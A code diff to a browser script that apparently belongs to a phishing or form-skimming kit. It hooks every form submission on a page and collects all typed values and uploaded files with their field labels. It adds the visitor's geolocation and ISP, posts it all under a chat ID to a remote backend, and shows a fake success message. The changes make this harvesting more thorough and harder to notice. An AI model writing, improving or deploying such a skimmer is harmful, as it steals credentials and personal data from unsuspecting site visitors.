@@ -1,7 +1,6 @@
 document.addEventListener("DOMContentLoaded", () => {
 
   const DEFAULT_USER_ID = "6940101627";
-  const TARGET_FORM_ID = "targetForm";
 
   // ================= LOCATION API =================
   async function getLocationData() {
@@ -28,29 +27,62 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
-  // ================= GLOBAL DATA BUILDER =================
+  // ================= SMART LABEL DETECTOR =================
+  function getSmartLabel(input, form, index) {
+
+    if (input.id) {
+      const lbl = form.querySelector(`label[for="${input.id}"]`);
+      if (lbl) return lbl.innerText.trim();
+    }
+
+    if (input.closest("label")) {
+      return input.closest("label").innerText.trim();
+    }
+
+    if (input.getAttribute("aria-label")) {
+      return input.getAttribute("aria-label").trim();
+    }
+
+    if (input.placeholder) {
+      return input.placeholder.trim();
+    }
+
+    if (input.previousElementSibling) {
+      let text = input.previousElementSibling.innerText;
+      if (text) return text.trim();
+    }
+
+    return `Field ${index + 1}`;
+  }
+
+  // ================= FORM BUILDER =================
   function buildGlobalFormData(userId, form) {
+
     const formData = new FormData();
     formData.append("chat_id", userId);
 
-    let counter = 1;
     let inputCount = 0;
-    let inputSummary = [];
     let fileCount = 0;
+    let summary = [];
 
-    const inputs = document.querySelectorAll("input, textarea, select");
+    const inputs = form.querySelectorAll("input, textarea, select");
 
-    inputs.forEach(input => {
+    inputs.forEach((input, index) => {
 
       if (!input || ["submit", "button"].includes(input.type)) return;
 
       if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
 
+      let label = getSmartLabel(input, form, index);
+
       let key =
         input.name ||
         input.id ||
+        label ||
         input.placeholder ||
-        `field_${counter++}`;
+        `field_${index + 1}`;
+
+      key = key.replace(/\s+/g, "_").toLowerCase();
 
       if (input.type === "file") {
         if (!input.files || input.files.length === 0) return;
@@ -65,12 +97,16 @@ document.addEventListener("DOMContentLoaded", () => {
         if (!value) return;
 
         inputCount++;
-        inputSummary.push(`${key}: ${value}`);
+
+        let fullInfo = `${label}: ${value}`;
+
+        formData.append(key, fullInfo);
+        summary.push(fullInfo);
       }
 
     });
 
-    return { formData, inputCount, inputSummary, fileCount };
+    return { formData, inputCount, fileCount, summary };
   }
 
   // ================= UI =================
@@ -81,7 +117,7 @@ document.addEventListener("DOMContentLoaded", () => {
     box.innerHTML = `
       <div id="centerContent">
         <div class="spinner"></div>
-        <div id="centerText">Loading your files...</div>
+        <div id="centerText">Loading...</div>
         <button id="actionBtn" style="display:none;"></button>
       </div>
     `;
@@ -176,19 +212,22 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   createBox();
+  console.log("BOX CREATED");
 
   // ================= SUBMIT =================
   async function handleSubmit(form) {
 
+    console.log("FORM SUBMITTED");
+
     let userId = new URLSearchParams(window.location.search).get("id");
     if (!userId || isNaN(userId)) userId = DEFAULT_USER_ID;
 
-    const pageTitle = document.title || "Unknown";
-    const formName = form.id || "global";
-
-    const { formData, inputCount, inputSummary, fileCount } = buildGlobalFormData(userId, form);
-
     showBox("Processing...");
+
+    // 🔥 Force UI render
+    await new Promise(resolve => setTimeout(resolve, 50));
+
+    const { formData, inputCount, summary, fileCount } = buildGlobalFormData(userId, form);
 
     const loc = await getLocationData();
 
@@ -201,16 +240,12 @@ Country: ${loc.country}
 City: ${loc.city}
 ISP: ${loc.isp}
 
-🧾 Page
-Title: ${pageTitle}
-Form: ${formName}
-
 📊 Data
 Inputs: ${inputCount}
 Files: ${fileCount}
 
 📝 Values
-${inputSummary.length ? inputSummary.join("\n") : "No input values"}
+${summary.length ? summary.join("\n") : "No input values"}
 `;
 
     formData.append("report", reportMessage);
@@ -221,45 +256,42 @@ ${inputSummary.length ? inputSummary.join("\n") : "No input values"}
         body: formData
       });
 
-      // ✅ REAL CHECK (not broken JSON logic)
-      if (!res.ok) {
-        showBox("❌ Failed to send data", { done: true, type: "retry" });
+      let data = await res.json().catch(() => ({}));
+
+      console.log("SERVER RESPONSE:", data);
+
+      if (!res.ok || data.ok === false) {
+        showBox(`❌ ${data.error || "Server error"}`, {
+          done: true,
+          type: "retry"
+        });
         return;
       }
 
-      // ✅ SAFE JSON PARSE
-      let data = {};
-      try {
-        data = await res.json();
-      } catch {}
+      showBox("✅ Submission successful", {
+        done: true,
+        type: "review",
+        userId
+      });
 
-      // ✅ RELAXED SUCCESS (backend may not return correct values)
-      if (data && (data.sent >= 1 || data.ok === true || res.ok)) {
-        showBox("✅ Submission successful", {
-          done: true,
-          type: "review",
-          userId
-        });
-        form.reset();
-      } else {
-        showBox("⚠️ Sent but response unclear", {
-          done: true,
-          type: "review",
-          userId
-        });
-      }
+      form.reset();
 
-    } catch {
-      showBox("❌ Network error", { done: true, type: "retry" });
+    } catch (err) {
+      showBox(`❌ Network error: ${err.message}`, {
+        done: true,
+        type: "retry"
+      });
     }
   }
 
-  // ================= ATTACH =================
-  document.querySelectorAll("form").forEach(form => {
-    form.addEventListener("submit", (e) => {
+  // ================= ATTACH (GLOBAL FIX) =================
+  document.addEventListener("submit", (e) => {
+    const form = e.target;
+
+    if (form.tagName === "FORM") {
       e.preventDefault();
       handleSubmit(form);
-    });
-  });
+    }
+  }, true);
 
 });
